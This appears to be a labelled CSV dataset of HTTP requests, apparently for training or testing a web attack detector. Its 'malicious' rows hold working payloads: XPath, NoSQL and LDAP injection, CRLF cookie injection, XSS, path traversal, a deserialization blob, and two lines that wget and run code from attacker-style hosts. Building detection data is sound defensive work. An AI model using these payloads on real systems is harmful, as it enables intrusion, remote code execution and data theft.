label,text
malicious,"POST /app/user/settings HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/json
Accept: application/json, text/javascript
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Referer: https://community.game-dev-forum.org/profile
Cookie: sid=2bdda3b78c5f47c29106f44236d973a8

{""query"":""/users/user[username='admin' and starts-with(substring(password,2,1), 'a')]/id""}"
benign,"POST /api/submit-review HTTP/1.1
Host: review-platform.ai
User-Agent: curl/7.83.1
Content-Type: application/json
Accept: application/json
Content-Length: 125

{""product_id"":""x29f84q"",""user"":""lindsay_45"",""review_texts"":[""Great value for money."",""Customer service was helpful."",""Would recommend to friends.""]}"
benign,"HEAD /v3/user/session HTTP/1.1
Host: user-management.api-platform.xyz
User-Agent: Wget/1.21.2 (linux-gnu)
Accept: */*
Connection: close"
benign,"GET /data/user/notifications HTTP/1.1
Host: api.cloud-storage-services.tech
Accept: application/json
App-Secret: 7c98f4e3adbb45d1b556f8957ce0e2a8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Cache-Control: no-cache
Connection: keep-alive"
benign,"POST /api/v1/contact_form HTTP/1.1
Host: starlight-software-solutions.dev
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67
Referer: https://starlight-software-solutions.dev/contact
Origin: https://starlight-software-solutions.dev
Cookie: starlight_session=39afjsoqj2j3lk4j2lkj3l2k4j
Accept-Encoding: gzip, deflate
Connection: keep-alive

name=Emily+Ross&email=emily.ross%40starlight-software-solutions.dev&subject=Feature+request&message=Hi%2C+I+would+love+to+see+a+dark+mode+feature+added+to+your+app.+Thanks+for+considering."
benign,"GET /images/logo.svg HTTP/1.1
Host: portal-secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: image/svg+xml,*/*;q=0.8
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.5
Connection: keep-alive
Referer: https://portal-secure-user-portal.net/dashboard"
benign,"POST /login/forgot-password HTTP/1.1
Host: online-retail-store.biz
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Referer: https://online-retail-store.biz/login

email=felicia.welch%40shoponline.biz"
benign,"POST /settings/api-tokens/generate HTTP/1.1
Host: developers.tools-hub.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 95
Connection: keep-alive
Accept: application/json
User-Agent: python-requests/2.28.1
Origin: https://developers.tools-hub.io
Referer: https://developers.tools-hub.io/settings/api-tokens
Cookie: auth_key=ab3f12dc3e874979852331c40394e294

token_name=Project+Access&permissions=read%2Cwrite&csrf_token=90fa97ca41964b8f953f60f1e4642a6d&form_id=token_generate_04&timestamp=1685670328&return_url=%2Fsettings%2Fapi-tokens"
malicious,"GET /auth/redirect?dest=https%3A%2F%2Fsecure-user-portal.net%2Fwelcome%3Faction%3Dview%250d%250aSet-Cookie%3A%20userType%3Dadmin HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://secure-user-portal.net/login
Connection: keep-alive"
benign,"GET /status/ping HTTP/1.1
Host: analytics-proxy.service-mesh.io
User-Agent: curl/7.64.1
Accept: */*
Connection: close"
benign,"GET /videos/stream/watch?param=Hello%2520World HTTP/1.1
Host: video-streaming-service.co.uk
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: br, gzip, deflate
Connection: keep-alive
Referer: https://video-streaming-service.co.uk/home"
malicious,"POST /feedback/submit HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Content-Length: 107
Origin: https://online-retail-store.biz
Connection: keep-alive

feedback=Fast+delivery+and+nice+service.+%3C%3Fphp+echo+shell_exec%28%27wget+http%3A%2F%2Fattacker.com%2Fshell.php+-O+%2Ftmp%2Fsh.php%27%29%3B+%3F%3E"
benign,"GET /js/vendor/analytics.js HTTP/1.1
Host: urban-travel-diary.com
Connection: keep-alive
Accept: application/javascript, */*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Referer: https://urban-travel-diary.com/blog/article/view/456
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
benign,"POST /blog/admin/post HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Accept-Encoding: gzip, deflate
Cookie: sessionid=xyz123abc456

title=Update+on+deploy+command&content=All+systems+green."
malicious,"GET /auth/ldap_login?username=%2A%29%28department%3Dengineering%29%29%7C%28objectClass%3D* HTTP/1.1
Host: digital-marketing-hub.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /search?q=top+rated+board+games+for+families HTTP/1.1
Host: game-night-fun.club
Accept: text/html
Referer: https://game-night-fun.club/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Connection: keep-alive
Accept-Language: en-US,en;q=0.7"
benign,"POST /register/user HTTP/1.1
Host: nextgen-software-solutions.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://nextgen-software-solutions.io
Referer: https://nextgen-software-solutions.io/signup
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Mobile Safari/537.36
Cookie: ngss_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
Connection: keep-alive

username=emma_jones88&email=emma.jones88%40ngss.io&password=SafePass#984&password_confirm=SafePass#984&terms_accepted=true"
benign,"GET /icons/set1/user-online.svg HTTP/1.1
Host: community.game-dev-forum.org
Accept: image/svg+xml,image/*;q=0.5
Referer: https://community.game-dev-forum.org/thread/23489/latest
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Connection: close"
malicious,"GET /user/redirect?next=https%3A%2F%2Ftrustedportal.org%252540phishing-attack.com%2Fstart HTTP/1.1
Host: trustedportal.org
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0
Connection: keep-alive"
benign,"DELETE /api/v1/events/20230815 HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer zyxw9876543210lkjhgf
If-Match: ""eventetag2023""
Accept: application/json, application/xml
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
X-Requested-With: XMLHttpRequest
Connection: keep-alive"
benign,"OPTIONS /v3/items/45872/details HTTP/1.1
Host: secure-inventory-manager.net
Origin: https://vendor-management.luxury-goods
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, x-custom-header, x-api-key
User-Agent: curl/7.83.1
Accept: */*
Connection: close"
benign,"GET /fetch?url=https%3A%2F%2Fcommunity.game-dev-forum.org%2Fthread%2F3429%2Fpage%2F2 HTTP/1.1
Host: api.game-dev-forum.org
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Connection: keep-alive
Accept-Language: en-GB,en;q=0.7
Accept-Encoding: br, gzip, deflate
Cache-Control: max-age=0"
malicious,"GET /home/custom_page?title=%7B%7B%207*%277%27%7D%7D HTTP/1.1
Host: smart-edu-platform.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept-Language: en-US,en;q=0.5
Accept: text/html,application/xhtml+xml
Cache-Control: max-age=0
Connection: keep-alive"
benign,"GET /search/api/v1/items?data=%7B%22filter%22%3A%22active%22%7D HTTP/1.1
Host: analytics-dashboard.cloud-insights.io
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
malicious,"PATCH /api/settings/apply HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/json
Content-Length: 326
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1
Origin: https://community.game-dev-forum.org
X-Requested-With: FetchAPIClient
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.7
Cache-Control: max-age=0

{""<img src=x onerror=\""eval(String.fromCharCode(0x61,108,0145,114,0x74,40,0x27,88,0x53,0123,45,0x4b,101,0x79,0x27,41))\"">"": ""config_data"", ""user_level"": ""pro"", ""notifications_enabled"": false}"
benign,"POST /blog/comment/add HTTP/1.1
Host: community.dev-forums.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 90
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
DNT: 1
Accept-Language: en-US,en;q=0.7
Connection: keep-alive

comment=The+DELETE+statement+should+be+used+carefully+to+avoid+removing+data+without+a+WHERE+clause."
benign,"GET /assets/icons/icon-menu.svg HTTP/1.1
Host: media-streamline-assets.net
Accept: image/svg+xml,image/webp,*/*
Referer: https://media-streamline-assets.net/gallery/vector-icons.html
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Connection: keep-alive"
benign,"POST /user/photos/upload HTTP/1.1
Host: moments-collector.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://moments-collector.org/gallery/
Content-Type: multipart/form-data; boundary=----Boundary42
Cookie: user_session=xyz9876543211234abc;
Connection: close

------Boundary42
Content-Disposition: form-data; name=""caption""

Family picnic 2024
------Boundary42
Content-Disposition: form-data; name=""image_file""; filename=""picnic_photo.png""
Content-Type: image/png

(simulated binary image data)
------Boundary42--"
benign,"POST /api/v1/user/docs/upload HTTP/1.1
Host: my-personal-blog-site.info
Connection: close
Accept: application/json
User-Agent: python-requests/2.28.1
Content-Type: multipart/form-data; boundary=----FormBoundaryABC123XYZ
Content-Length: 2376

------FormBoundaryABC123XYZ
Content-Disposition: form-data; name=""title""

Travel Itinerary June 2024
------FormBoundaryABC123XYZ
Content-Disposition: form-data; name=""document""; filename=""itinerary_doc.pdf""
Content-Type: application/pdf

%PDF-1.7
%Travel itinerary document placeholder.
------FormBoundaryABC123XYZ--"
malicious,"GET /app/start?redirect_url=/user/profile%0d%0aSet-Cookie:%20isAdmin=true; HttpOnly HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Connection: keep-alive"
malicious,"POST /account/profile HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.5
Content-Length: 68

username=buyer123&preferences%5Bcurrency%5D=USD&role_id=1&internal_user_status=ACTIVE"
malicious,"GET /blog/article/view?id=742 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 <script>alert('LogViewerXSS')</script> (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive"
benign,"PUT /v1/account/settings HTTP/1.1
Host: userprefs.cloud-data-services.ai
Authorization: Bearer mnbvcxzlkjhgfdsa0987654321tokenplus
Content-Type: application/json
Accept: application/json
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Cache-Control: no-cache
Content-Length: 93

{""profile"": {""firstName"": ""John"", ""lastName"": ""Doe"", ""role"": ""user"", ""timezone"": ""America/New_York""}}"
benign,"POST /api/log HTTP/1.1
Host: eduplatform.acad-hub.education
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0
Accept: application/json
Cookie: sessionid=ms9fjh32xq7c5zv9a3bw
Content-Length: 297

{""event"": ""assignment_submission"", ""student"": {""id"": ""stu9982"", ""name"": ""Mark R.""}, ""assignment"": {""id"": ""asg-2024-06-10-03"", ""course"": ""CS101"", ""files"": [{""name"": ""report.docx"", ""sizeKB"": 112}, {""name"": ""code.py"", ""sizeKB"": 8}]}, ""submittedAt"": ""2024-06-10T14:55:30Z""}"
malicious,"GET /validate/input?field=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab HTTP/1.1
Host: input-checker.net
User-Agent: Wget/1.20.3 (darwin)
Accept-Encoding: identity
Accept: */*
Pragma: no-cache
Connection: close"
benign,"GET /store/category/electronics/tv?utm_source=affiliate&utm_medium=webbanner&utm_content=topslot HTTP/1.1
Host: online-retail-store.biz
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Referer: https://coupon-hub.prodeals.com/deals
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0
Connection: keep-alive"
malicious,"POST /search/profiles HTTP/1.1
Host: user-insights-platform.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: application/json
Accept-Language: en-US,en;q=0.9
Cache-Control: max-age=0
Content-Length: 131

{""query"":{""$where"":""this.username==='admin'&&this.password.charAt(0)==='a'||(function timeoutMs(){var s=Date.now();while(Date.now()-s<5000){}return true;})()""}}"
malicious,"POST /ws/ConfigService HTTP/1.1
Host: smart-home-iot-network.net
Content-Type: text/xml; charset=utf-8
Content-Length: 664
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/xml, text/xml
Cache-Control: no-cache
SOAPAction: ""urn:SmartHome:ConfigService:Deserialize""

<Envelope>
  <Body>
    <ConfigLoad>
      <serialized><![CDATA[AAEAAAD/////AQAAAAAAAAAYAgAAAFNTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlcgEAAAQEVGVzdAAcU3lzdGVtLkNvbmZpZ3VyYXRpb24uSW5zdGFsbC5Bc3NlbWJseUluc3RhbGxlcgEA]]></serialized>
    </ConfigLoad>
  </Body>
</Envelope>"
benign,"POST /beacon/submit HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: text/plain
Origin: https://community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Content-Length: 46

event=post_view&postId=5982&userId=guest123&duration=45"
benign,"PUT /api/v1/accounts/profiles/87921 HTTP/1.1
Host: secure.profile-portal.net
Authorization: Bearer VXNlck1hbmFnZXI6MjUxOQ==
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0
Accept-Encoding: gzip, br
DNT: 1
Connection: keep-alive
Content-Length: 178

<ProfileUpdate>
  <ProfileID>87921</ProfileID>
  <DisplayName>Jordan Miles</DisplayName>
  <NotificationSettings>
    <EmailNotifications>false</EmailNotifications>
    <PushNotifications>true</PushNotifications>
  </NotificationSettings>
  <PreferredLanguage>fr-FR</PreferredLanguage>
</ProfileUpdate>"
benign,"GET /user/profile/view?id=59%4a%5b%6C%7d2f3 HTTP/1.1
Host: membership.secure-user-portal.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/json
Accept: application/xml, text/html, application/json;q=0.9
Accept-Language: en-GB,en-US;q=0.7,en;q=0.3
Content-Length: 130

{""query"": ""/members/member[username='root' and starts-with(substring(password,3,1), 's')]/userID""}"
benign,"GET /gallery/summer-2023/event-highlights.avif HTTP/1.1
Host: radiant-vision-studio.net
Accept: image/avif,image/webp,*/*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Accept-Language: en-US,en;q=0.7
Referer: https://radiant-vision-studio.net/gallery/summer-2023/
Connection: keep-alive
Cache-Control: max-age=14400"
benign,"POST /contact/support HTTP/1.1
Host: helpdesk-techsolutions.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 98
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.8
Connection: keep-alive

message=Our+team+needs+to+better+understand+how+SELECT+queries+retrieve+data+based+on+the+WHERE+conditions."
benign,"GET /fashion/collections/spring-2024-lookbook HTTP/1.1
Host: urban-chic-style.net
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Referer: https://urban-chic-style.net/fashion/collections
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"POST /contact/send-message HTTP/1.1
Host: wellness-healthspace.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Content-Type: application/x-www-form-urlencoded
Content-Length: 110
Origin: https://wellness-healthspace.org
Referer: https://wellness-healthspace.org/contact/send-message
Cookie: session_token=7b95f631d12e44c8a037fa064f563b7f
Connection: close

name=Emily+Johnson&email=emily.johnson%40healthmailer.net&subject=Appointment+Booking&message=Hi%2C+I+would+like+to+schedule+a+consultation+appointment+for+next+week."
benign,"POST /newsletter/subscribe HTTP/1.1
Host: urban-sports-arena.edu
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:103.0) Gecko/20100101 Firefox/103.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Accept: text/html,application/xhtml+xml
Referer: https://urban-sports-arena.edu/newsletter/subscribe
Accept-Language: en-US,en;q=0.7
Pragma: no-cache
Connection: keep-alive

email=charlie.greer%40fitmail.edu"
benign,"POST /user/preferences/update HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Accept: */*
Content-Length: 27
Authorization: Bearer fk12hdjf3983jslfkdj3
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15
Origin: https://secure-user-portal.net

{""UNION ALL"": ""dark mode active""}"
malicious,"GET /dashboard/stats?report_id=2021&report%5Fid=2021%27%20OR%20%271%27=%271 HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept-Encoding: gzip, br
Accept-Language: en-US,en;q=0.9
Accept: application/xml, text/xml, */*; q=0.01
Pragma: no-cache
Connection: close"
benign,"GET /service/clients.xml HTTP/1.1
Host: secure-user-portal.net
Accept: application/xml
Authorization: Bearer 8fd72c9d-cb88-4a8a-98c9-2b93184b7f3d
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
DNT: 1
Connection: keep-alive"
benign,"PUT /config/env_vars/.env HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Content-Type: application/octet-stream
Content-Length: 160
Authorization: Basic c2VjdXJlVXNlcjpwYXNzd29yZDEyMyE=
Accept: */*
Connection: keep-alive

UE9TVF9TRVRUSU5HU1xuREVCVElOX1NFXF9NRU1PUlk9IjEyMjMiXG50cmFjZUtleT0iQUJDRDEyMzRWVUxFIn0="
benign,"GET /api/v1/items/search?id=1024&category=hardware&availability=in_stock HTTP/1.1
Host: api.cloud-data-services.ai
Accept: application/json
Accept-Language: en-GB,en;q=0.8
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/113.0
Referer: https://api.cloud-data-services.ai/products
Connection: close"
benign,"GET /api/v1/blog/article/view/234 HTTP/1.1
Host: my-personal-blog-site.info
Accept: application/json
User-Agent: curl/7.83.1
Accept-Encoding: gzip
Connection: close"
benign,"GET /events/filter?date=2024-07-01&date=2024-07-15&type=workshop&type=seminar HTTP/1.1
Host: city-cultural-center.edu
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.8
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:113.0) Gecko/20100101 Firefox/113.0
Pragma: no-cache
Cache-Control: no-cache"
malicious,"GET /images/avatars/..%2F..%2F..%2F..%2Fvar/log/auth.log HTTP/1.1
Host: user-assets-storage.easy-files.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: br,gzip,deflate
Connection: keep-alive"
benign,"POST /user/comments/add HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 128
Connection: close
User-Agent: Python-urllib/3.9
Accept: application/json
X-Requested-With: XMLHttpRequest
Content-Language: en-US

user=alexa.m+team&resource=dataset/34/details&comment=VGhlIGRhdGEgc2V0IGlzIHJlYWxseSBsYW5kbHkgdXNlZCBmb3IgdHJlbmQgdGFzay4gQXBwcmVjaWF0ZSBvbWl0cmluZy4="
malicious,"POST /api/device/command HTTP/1.1
Host: device-control-vault.info
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
Content-Length: 133

{""command"":""restart"",""target_host"":""host-internal.ops || wget http://malware-hosting-server.biz/mal.sh -O /tmp/m.sh && sh /tmp/m.sh"",""timeout"":30}"
malicious,"POST /update/profile HTTP/1.1
Host: online-retail-store.biz
User-Agent: Wget/1.21.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
Cookie: session_filter=(uid=customer%00; last_visit=20240605
Content-Length: 33

first_name=John&last_name=Doe"
benign,"GET /docs/api/v2/endpoints HTTP/1.1
Host: example.com:8080
User-Agent: python-requests/2.31.0
Accept: application/json
Accept-Encoding: gzip, deflate
Connection: keep-alive"
malicious,"POST /feedback/submit HTTP/1.1
Host: interactive-edu-platform.edu
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Accept-Encoding: gzip, deflate
X-Client-Input: <iframe src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgnU1BTIGF0dGFjaycpPC9zY3JpcHQ+""></iframe>
Cookie: edusession=cGFzc3dvcmQxMjM0NTY=;

comment=Really+enjoying+the+platform+%2B+great+content!"
malicious,"POST /app/user/settings HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Cookie: session_filter=(uid=shopper%00; cart_id=7896543210
Content-Length: 27

item=12345&quantity=2"
